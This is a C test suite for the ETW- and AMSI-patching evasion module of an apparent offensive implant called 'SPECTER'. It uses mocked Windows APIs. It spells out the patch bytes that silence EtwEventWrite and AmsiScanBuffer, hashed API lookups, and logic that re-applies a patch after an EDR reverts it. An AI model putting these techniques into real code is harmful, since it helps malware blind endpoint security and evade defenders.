/**
 * SPECTER Implant — ETW Suppression Test Suite
 *
 * Tests evasion_patch_etw, evasion_check_etw_patches, and
 * evasion_patch_amsi with mock module resolution and memory
 * protection stubs.
 *
 * Build (native, not PIC):
 *   gcc -o test_etw test_etw.c \
 *       ../core/src/evasion/etw.c \
 *       -I../core/include -DTEST_BUILD
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ------------------------------------------------------------------ */
/* Type stubs (no windows.h)                                           */
/* ------------------------------------------------------------------ */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef unsigned int        DWORD;
typedef unsigned long long  QWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long                LONG;
typedef long                NTSTATUS;
typedef int                 BOOL;
typedef unsigned int        ULONG;
typedef short               SHORT;
typedef unsigned short      WCHAR;
typedef char                CHAR;
typedef unsigned char       UCHAR;
typedef void                VOID;
typedef void*               PVOID;
typedef void*               HANDLE;
typedef BYTE*               PBYTE;
typedef DWORD*              PDWORD;
typedef ULONG*              PULONG;
typedef SIZE_T*             PSIZE_T;
typedef WCHAR*              PWCHAR;
typedef const char*         PCSTR;
typedef const WCHAR*        PCWSTR;
typedef LONG*               PLONG;
typedef void**              PHANDLE;

#define TRUE  1
#define FALSE 0
#ifndef NULL
#define NULL ((void*)0)
#endif
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000D)
#define STATUS_PROCEDURE_NOT_FOUND  ((NTSTATUS)0xC000007A)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034)
#define STATUS_ACCESS_DENIED        ((NTSTATUS)0xC0000022)
#define INVALID_HANDLE_VALUE ((HANDLE)(ULONG_PTR)-1)

#define PAGE_NOACCESS           0x01
#define PAGE_READONLY           0x02
#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE            0x10
#define PAGE_EXECUTE_READ       0x20
#define PAGE_EXECUTE_READWRITE  0x40
#define PAGE_GUARD              0x100

#define MEM_COMMIT              0x00001000
#define MEM_RESERVE             0x00002000
#define MEM_RELEASE             0x00008000

/* Stub PE structures */
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWCHAR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink, *Blink; } LIST_ENTRY, *PLIST_ENTRY;
typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; LIST_ENTRY HashLinks; ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB_LDR_DATA { ULONG Length; BOOL Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;
typedef struct _PEB { BYTE InheritedAddressSpace; BYTE ReadImageFileExecOptions; BYTE BeingDebugged; BYTE BitField; BYTE Padding0[4]; PVOID Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr; } PEB, *PPEB;
typedef struct _IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER;
typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY;
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define IMAGE_DIRECTORY_ENTRY_EXPORT 0
typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; QWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; QWORD SizeOfStackReserve; QWORD SizeOfStackCommit; QWORD SizeOfHeapReserve; QWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64;
typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY;
typedef struct _IMAGE_SECTION_HEADER { BYTE Name[8]; DWORD VirtualSize; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER;

typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, *PCLIENT_ID;
typedef union _LARGE_INTEGER { struct { DWORD LowPart; LONG HighPart; }; long long QuadPart; } LARGE_INTEGER, *PLARGE_INTEGER;
typedef struct _MEMORY_BASIC_INFORMATION { PVOID BaseAddress; PVOID AllocationBase; DWORD AllocationProtect; WORD PartitionId; WORD Padding; SIZE_T RegionSize; DWORD State; DWORD Protect; DWORD Type; } MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
typedef enum _PROCESSINFOCLASS { ProcessBasicInformation = 0, ProcessDebugPort = 7, ProcessWow64Information = 26, ProcessImageFileName = 27, ProcessBreakOnTermination = 29 } PROCESSINFOCLASS;
typedef enum _SECTION_INHERIT { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT;

typedef struct _SYSCALL_ENTRY { DWORD ssn; PVOID syscall_addr; DWORD hash; } SYSCALL_ENTRY;
typedef struct _SYSCALL_TABLE { SYSCALL_ENTRY entries[50]; DWORD count; PVOID clean_ntdll; } SYSCALL_TABLE;
typedef struct _IMPLANT_CONTEXT { SYSCALL_TABLE *syscall_table; PVOID clean_ntdll; PVOID config; PVOID comms_ctx; PVOID sleep_ctx; PVOID evasion_ctx; PVOID module_bus; BOOL running; } IMPLANT_CONTEXT;

IMPLANT_CONTEXT g_ctx;

/* ------------------------------------------------------------------ */
/* String/memory stubs using libc                                      */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s) { return strlen(s); }
SIZE_T spec_wcslen(const WCHAR *s) { SIZE_T n=0; while(s[n]) n++; return n; }
int spec_strcmp(const char *a, const char *b) { return strcmp(a,b); }
int spec_wcsicmp(const WCHAR *a, const WCHAR *b) { (void)a; (void)b; return 0; }
void *spec_memcpy(void *d, const void *s, SIZE_T n) { return memcpy(d,s,n); }
void *spec_memmove(void *d, const void *s, SIZE_T n) { return memmove(d,s,n); }
void *spec_memset(void *d, int c, SIZE_T n) { return memset(d,c,n); }
int spec_memcmp(const void *a, const void *b, SIZE_T n) { return memcmp(a,b,n); }
char *spec_strcpy(char *d, const char *s) { return strcpy(d,s); }
char *spec_strcat(char *d, const char *s) { return strcat(d,s); }
DWORD spec_djb2_hash(const char *str) { DWORD h=5381; int c; while((c=*str++)){if(c>='A'&&c<='Z')c+=0x20;h=((h<<5)+h)+c;} return h; }
DWORD spec_djb2_hash_w(const WCHAR *str) { (void)str; return 0; }
PPEB get_peb(void) { return NULL; }

/* ------------------------------------------------------------------ */
/* Mock module/export resolution                                       */
/* ------------------------------------------------------------------ */

/* Fake function buffers that we'll patch */
static BYTE fake_etw_func[16];
static BYTE fake_amsi_func[16];

/* Control flags for mock behavior */
static BOOL mock_ntdll_available = TRUE;
static BOOL mock_etw_export_available = TRUE;
static BOOL mock_amsi_dll_available = FALSE;  /* amsi.dll lazy */
static BOOL mock_amsi_export_available = TRUE;
static BOOL mock_protect_fail = FALSE;

/* Hash constants matching evasion.h */
#define HASH_NTDLL_DLL      0x22D3B5ED
#define HASH_KERNEL32_DLL   0x7040EE75
#define HASH_ETWEVENTWRITE  0x941F3482
#define HASH_AMSI_DLL       0xDAF90FD9
#define HASH_AMSISCANBUFFER 0x5DFB3DEE

PVOID find_module_by_hash(DWORD h) {
    if (h == HASH_NTDLL_DLL && mock_ntdll_available)
        return (PVOID)0x7FFE0000;  /* Fake ntdll base */
    if (h == HASH_AMSI_DLL && mock_amsi_dll_available)
        return (PVOID)0x7FFC0000;  /* Fake amsi base */
    return NULL;
}

PVOID find_export_by_hash(PVOID module_base, DWORD h) {
    (void)module_base;
    if (h == HASH_ETWEVENTWRITE && mock_etw_export_available)
        return &fake_etw_func[0];
    if (h == HASH_AMSISCANBUFFER && mock_amsi_export_available)
        return &fake_amsi_func[0];
    return NULL;
}

PVOID resolve_function(DWORD mh, DWORD fh) {
    PVOID mod = find_module_by_hash(mh);
    if (!mod) return NULL;
    return find_export_by_hash(mod, fh);
}

/* ------------------------------------------------------------------ */
/* Mock syscall wrappers                                               */
/* ------------------------------------------------------------------ */

static int protect_call_count = 0;
static ULONG last_protect_requested = 0;

NTSTATUS spec_NtProtectVirtualMemory(HANDLE process, PVOID *base,
    PSIZE_T size, ULONG new_protect, PULONG old_protect) {
    (void)process;
    (void)base;
    (void)size;
    protect_call_count++;
    last_protect_requested = new_protect;

    if (mock_protect_fail)
        return STATUS_ACCESS_DENIED;

    if (old_protect)
        *old_protect = PAGE_EXECUTE_READ;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/* Evasion types (inline, matching evasion.h)                          */
/* ------------------------------------------------------------------ */

#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3

typedef struct _RUNTIME_FUNCTION {
    DWORD BeginAddress;
    DWORD EndAddress;
    DWORD UnwindInfoAddress;
} RUNTIME_FUNCTION, *PRUNTIME_FUNCTION;

#define HASH_USER32_DLL     0x5E5AB823
#define HASH_RPCRT4_DLL     0xBB09A486
#define HASH_COMBASE_DLL    0xBC8E54C5
#define HASH_RTLUSERTHREADSTART     0xA2E74681
#define HASH_BASETHREADINITTHUNK    0xD83D6AA1
#define HASH_ETWEVENTWRITEEX        0x18BE6A7F

#define ETW_PATCH_SIZE  3
#define AMSI_PATCH_SIZE 6

#define FRAME_MAX_ENTRIES   256
#define FRAME_CHAIN_MAX     8
#define SAVED_FRAMES_MAX    16

typedef struct _FRAME_ENTRY {
    PVOID  code_start;
    PVOID  code_end;
    PVOID  unwind_info;
    DWORD  module_hash;
} FRAME_ENTRY;

typedef struct _FRAME_LIBRARY {
    FRAME_ENTRY entries[FRAME_MAX_ENTRIES];
    DWORD       count;
    DWORD       max_capacity;
} FRAME_LIBRARY;

typedef struct _SAVED_STACK_FRAMES {
    QWORD  original_rsp;
    QWORD  saved_return_addrs[SAVED_FRAMES_MAX];
    QWORD  saved_rbp_chain[SAVED_FRAMES_MAX];
    DWORD  frame_count;
} SAVED_STACK_FRAMES;

#define CRC_TABLE_CAPACITY  64
#define CRC_CHECK_BYTES     32

typedef struct _CRC_ENTRY {
    DWORD func_hash;
    DWORD crc_value;
    PVOID func_addr;
} CRC_ENTRY;

typedef struct _CRC_TABLE {
    CRC_ENTRY entries[CRC_TABLE_CAPACITY];
    DWORD     count;
} CRC_TABLE;

typedef struct _EVASION_CONTEXT {
    FRAME_LIBRARY  frame_lib;
    PVOID          clean_ntdll;
    CRC_TABLE      crc_table;
    BOOL           etw_patched;
    BOOL           amsi_patched;
    BYTE           etw_original[8];
    BYTE           amsi_original[8];
    PVOID          etw_patch_addr;
    PVOID          amsi_patch_addr;
    DWORD          prng_state;
} EVASION_CONTEXT;

/* Declarations from etw.c */
NTSTATUS evasion_patch_etw(EVASION_CONTEXT *ctx);
NTSTATUS evasion_check_etw_patches(EVASION_CONTEXT *ctx);
NTSTATUS evasion_patch_amsi(EVASION_CONTEXT *ctx);

/* ------------------------------------------------------------------ */
/*  Test framework                                                     */
/* ------------------------------------------------------------------ */

static int tests_run = 0;
static int tests_passed = 0;

#define ASSERT(cond, msg) do { \
    tests_run++; \
    if (!(cond)) { \
        printf("  FAIL: %s (line %d)\n", msg, __LINE__); \
    } else { \
        tests_passed++; \
    } \
} while(0)

/* Expected patch bytes */
static const BYTE expected_etw_patch[3] = { 0x31, 0xC0, 0xC3 };
static const BYTE expected_amsi_patch[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

/* ------------------------------------------------------------------ */
/*  Helper: reset test state                                           */
/* ------------------------------------------------------------------ */

static void reset_state(void) {
    memset(fake_etw_func, 0xCC, sizeof(fake_etw_func));   /* Fill with INT3 */
    memset(fake_amsi_func, 0xCC, sizeof(fake_amsi_func));
    mock_ntdll_available = TRUE;
    mock_etw_export_available = TRUE;
    mock_amsi_dll_available = FALSE;
    mock_amsi_export_available = TRUE;
    mock_protect_fail = FALSE;
    protect_call_count = 0;
    last_protect_requested = 0;
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_etw with NULL context                          */
/* ------------------------------------------------------------------ */

static void test_patch_etw_null_ctx(void) {
    printf("[test_patch_etw_null_ctx]\n");

    NTSTATUS status = evasion_patch_etw(NULL);
    ASSERT(status == STATUS_INVALID_PARAMETER, "NULL ctx returns invalid param");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_etw success path                               */
/* ------------------------------------------------------------------ */

static void test_patch_etw_success(void) {
    printf("[test_patch_etw_success]\n");

    reset_state();
    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = evasion_patch_etw(&ctx);
    ASSERT(NT_SUCCESS(status), "patch_etw succeeds");
    ASSERT(ctx.etw_patched == TRUE, "etw_patched flag set");
    ASSERT(ctx.etw_patch_addr == &fake_etw_func[0], "patch addr recorded");

    /* Verify patch bytes were written */
    ASSERT(memcmp(fake_etw_func, expected_etw_patch, 3) == 0,
           "ETW patch bytes correct (xor eax,eax; ret)");

    /* Verify original bytes were saved */
    BYTE expected_orig[3] = { 0xCC, 0xCC, 0xCC };
    ASSERT(memcmp(ctx.etw_original, expected_orig, 3) == 0,
           "original bytes saved");

    /* Verify NtProtectVirtualMemory was called (set RWX then restore) */
    ASSERT(protect_call_count == 2, "protect called twice (set+restore)");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_etw when ntdll not found                       */
/* ------------------------------------------------------------------ */

static void test_patch_etw_no_ntdll(void) {
    printf("[test_patch_etw_no_ntdll]\n");

    reset_state();
    mock_ntdll_available = FALSE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = evasion_patch_etw(&ctx);
    ASSERT(status == STATUS_UNSUCCESSFUL, "fails when ntdll not found");
    ASSERT(ctx.etw_patched == FALSE, "etw_patched stays false");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_etw when export not found                      */
/* ------------------------------------------------------------------ */

static void test_patch_etw_no_export(void) {
    printf("[test_patch_etw_no_export]\n");

    reset_state();
    mock_etw_export_available = FALSE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = evasion_patch_etw(&ctx);
    ASSERT(status == STATUS_PROCEDURE_NOT_FOUND, "fails when export not found");
    ASSERT(ctx.etw_patched == FALSE, "etw_patched stays false");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_etw when VirtualProtect fails                  */
/* ------------------------------------------------------------------ */

static void test_patch_etw_protect_fail(void) {
    printf("[test_patch_etw_protect_fail]\n");

    reset_state();
    mock_protect_fail = TRUE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = evasion_patch_etw(&ctx);
    ASSERT(!NT_SUCCESS(status), "fails when VirtualProtect fails");
    ASSERT(ctx.etw_patched == FALSE, "etw_patched stays false");

    /* Original function bytes should be untouched (patch couldn't apply) */
    BYTE expected[3] = { 0xCC, 0xCC, 0xCC };
    ASSERT(memcmp(fake_etw_func, expected, 3) == 0,
           "function not patched on protect failure");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_check_etw_patches when not patched                   */
/* ------------------------------------------------------------------ */

static void test_check_etw_not_patched(void) {
    printf("[test_check_etw_not_patched]\n");

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = evasion_check_etw_patches(&ctx);
    ASSERT(status == STATUS_UNSUCCESSFUL, "check fails when not patched");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_check_etw_patches with intact patch                  */
/* ------------------------------------------------------------------ */

static void test_check_etw_intact(void) {
    printf("[test_check_etw_intact]\n");

    reset_state();
    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    /* First, apply the patch */
    evasion_patch_etw(&ctx);
    protect_call_count = 0;

    /* Check — patch is still in place, should succeed without re-applying */
    NTSTATUS status = evasion_check_etw_patches(&ctx);
    ASSERT(NT_SUCCESS(status), "check succeeds when patch intact");
    ASSERT(protect_call_count == 0, "no VirtualProtect calls needed");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_check_etw_patches re-applies reverted patch          */
/* ------------------------------------------------------------------ */

static void test_check_etw_reapply(void) {
    printf("[test_check_etw_reapply]\n");

    reset_state();
    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    /* Apply initial patch */
    evasion_patch_etw(&ctx);

    /* Simulate EDR reverting the patch */
    memset(fake_etw_func, 0x90, 3);  /* NOP sled */
    protect_call_count = 0;

    /* Check — should detect revert and re-apply */
    NTSTATUS status = evasion_check_etw_patches(&ctx);
    ASSERT(NT_SUCCESS(status), "re-application succeeds");
    ASSERT(memcmp(fake_etw_func, expected_etw_patch, 3) == 0,
           "patch re-applied correctly");
    ASSERT(protect_call_count == 2, "VirtualProtect called for re-apply");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: calling patch_etw twice when already patched                 */
/* ------------------------------------------------------------------ */

static void test_patch_etw_idempotent(void) {
    printf("[test_patch_etw_idempotent]\n");

    reset_state();
    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    /* First call */
    evasion_patch_etw(&ctx);
    ASSERT(ctx.etw_patched == TRUE, "patched after first call");

    protect_call_count = 0;

    /* Second call — should verify patch, not re-resolve */
    NTSTATUS status = evasion_patch_etw(&ctx);
    ASSERT(NT_SUCCESS(status), "second call succeeds");
    ASSERT(protect_call_count == 0, "no protect calls (patch still intact)");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_amsi with NULL context                         */
/* ------------------------------------------------------------------ */

static void test_patch_amsi_null_ctx(void) {
    printf("[test_patch_amsi_null_ctx]\n");

    NTSTATUS status = evasion_patch_amsi(NULL);
    ASSERT(status == STATUS_INVALID_PARAMETER, "NULL ctx returns invalid param");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_amsi when amsi.dll not loaded                  */
/* ------------------------------------------------------------------ */

static void test_patch_amsi_not_loaded(void) {
    printf("[test_patch_amsi_not_loaded]\n");

    reset_state();
    mock_amsi_dll_available = FALSE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = evasion_patch_amsi(&ctx);
    ASSERT(status == STATUS_OBJECT_NAME_NOT_FOUND,
           "returns not found when amsi.dll not loaded");
    ASSERT(ctx.amsi_patched == FALSE, "amsi_patched stays false");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_amsi success                                   */
/* ------------------------------------------------------------------ */

static void test_patch_amsi_success(void) {
    printf("[test_patch_amsi_success]\n");

    reset_state();
    mock_amsi_dll_available = TRUE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = evasion_patch_amsi(&ctx);
    ASSERT(NT_SUCCESS(status), "patch_amsi succeeds");
    ASSERT(ctx.amsi_patched == TRUE, "amsi_patched flag set");
    ASSERT(ctx.amsi_patch_addr == &fake_amsi_func[0], "patch addr recorded");

    /* Verify patch bytes: mov eax, 0x80070057; ret */
    ASSERT(memcmp(fake_amsi_func, expected_amsi_patch, 6) == 0,
           "AMSI patch bytes correct");

    /* Verify original bytes saved */
    BYTE expected_orig[6] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
    ASSERT(memcmp(ctx.amsi_original, expected_orig, 6) == 0,
           "original AMSI bytes saved");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_amsi when export not found                     */
/* ------------------------------------------------------------------ */

static void test_patch_amsi_no_export(void) {
    printf("[test_patch_amsi_no_export]\n");

    reset_state();
    mock_amsi_dll_available = TRUE;
    mock_amsi_export_available = FALSE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = evasion_patch_amsi(&ctx);
    ASSERT(status == STATUS_PROCEDURE_NOT_FOUND,
           "fails when AmsiScanBuffer not found");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_amsi idempotent (re-verify)                    */
/* ------------------------------------------------------------------ */

static void test_patch_amsi_idempotent(void) {
    printf("[test_patch_amsi_idempotent]\n");

    reset_state();
    mock_amsi_dll_available = TRUE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    /* First call */
    evasion_patch_amsi(&ctx);
    protect_call_count = 0;

    /* Second call — should verify, not re-resolve */
    NTSTATUS status = evasion_patch_amsi(&ctx);
    ASSERT(NT_SUCCESS(status), "second call succeeds");
    ASSERT(protect_call_count == 0, "no protect calls (patch still intact)");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_patch_amsi re-applies reverted patch                 */
/* ------------------------------------------------------------------ */

static void test_patch_amsi_reapply(void) {
    printf("[test_patch_amsi_reapply]\n");

    reset_state();
    mock_amsi_dll_available = TRUE;

    EVASION_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    evasion_patch_amsi(&ctx);

    /* Simulate revert */
    memset(fake_amsi_func, 0x90, 6);
    protect_call_count = 0;

    NTSTATUS status = evasion_patch_amsi(&ctx);
    ASSERT(NT_SUCCESS(status), "re-application succeeds");
    ASSERT(memcmp(fake_amsi_func, expected_amsi_patch, 6) == 0,
           "AMSI patch re-applied correctly");
    ASSERT(protect_call_count == 2, "VirtualProtect called for re-apply");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: evasion_check_etw_patches with NULL context                  */
/* ------------------------------------------------------------------ */

static void test_check_etw_null_ctx(void) {
    printf("[test_check_etw_null_ctx]\n");

    NTSTATUS status = evasion_check_etw_patches(NULL);
    ASSERT(status == STATUS_INVALID_PARAMETER, "NULL ctx returns invalid param");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: verify hash constants match djb2 computation                 */
/* ------------------------------------------------------------------ */

static void test_hash_constants(void) {
    printf("[test_hash_constants]\n");

    ASSERT(spec_djb2_hash("EtwEventWrite") == HASH_ETWEVENTWRITE,
           "HASH_ETWEVENTWRITE matches djb2");
    ASSERT(spec_djb2_hash("EtwEventWriteEx") == HASH_ETWEVENTWRITEEX,
           "HASH_ETWEVENTWRITEEX matches djb2");
    ASSERT(spec_djb2_hash("AmsiScanBuffer") == HASH_AMSISCANBUFFER,
           "HASH_AMSISCANBUFFER matches djb2");
    ASSERT(spec_djb2_hash("amsi.dll") == HASH_AMSI_DLL,
           "HASH_AMSI_DLL matches djb2");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Test: patch bytes encode correct instructions                      */
/* ------------------------------------------------------------------ */

static void test_patch_byte_encoding(void) {
    printf("[test_patch_byte_encoding]\n");

    /* ETW: xor eax, eax = 0x31 0xC0; ret = 0xC3 */
    ASSERT(expected_etw_patch[0] == 0x31, "ETW byte 0: 0x31 (xor)");
    ASSERT(expected_etw_patch[1] == 0xC0, "ETW byte 1: 0xC0 (eax,eax)");
    ASSERT(expected_etw_patch[2] == 0xC3, "ETW byte 2: 0xC3 (ret)");

    /* AMSI: mov eax, 0x80070057 = B8 57 00 07 80; ret = C3 */
    ASSERT(expected_amsi_patch[0] == 0xB8, "AMSI byte 0: 0xB8 (mov eax)");
    ASSERT(expected_amsi_patch[1] == 0x57, "AMSI byte 1: 0x57 (low byte)");
    ASSERT(expected_amsi_patch[2] == 0x00, "AMSI byte 2: 0x00");
    ASSERT(expected_amsi_patch[3] == 0x07, "AMSI byte 3: 0x07");
    ASSERT(expected_amsi_patch[4] == 0x80, "AMSI byte 4: 0x80 (high byte)");
    ASSERT(expected_amsi_patch[5] == 0xC3, "AMSI byte 5: 0xC3 (ret)");

    printf("  Passed.\n");
}

/* ------------------------------------------------------------------ */
/*  Main                                                               */
/* ------------------------------------------------------------------ */

int main(void) {
    printf("=== SPECTER ETW Suppression Test Suite ===\n\n");

    test_patch_etw_null_ctx();
    test_patch_etw_success();
    test_patch_etw_no_ntdll();
    test_patch_etw_no_export();
    test_patch_etw_protect_fail();
    test_check_etw_null_ctx();
    test_check_etw_not_patched();
    test_check_etw_intact();
    test_check_etw_reapply();
    test_patch_etw_idempotent();
    test_patch_amsi_null_ctx();
    test_patch_amsi_not_loaded();
    test_patch_amsi_success();
    test_patch_amsi_no_export();
    test_patch_amsi_idempotent();
    test_patch_amsi_reapply();
    test_hash_constants();
    test_patch_byte_encoding();

    printf("\n=== Results: %d/%d passed ===\n", tests_passed, tests_run);
    return (tests_passed == tests_run) ? 0 : 1;
}
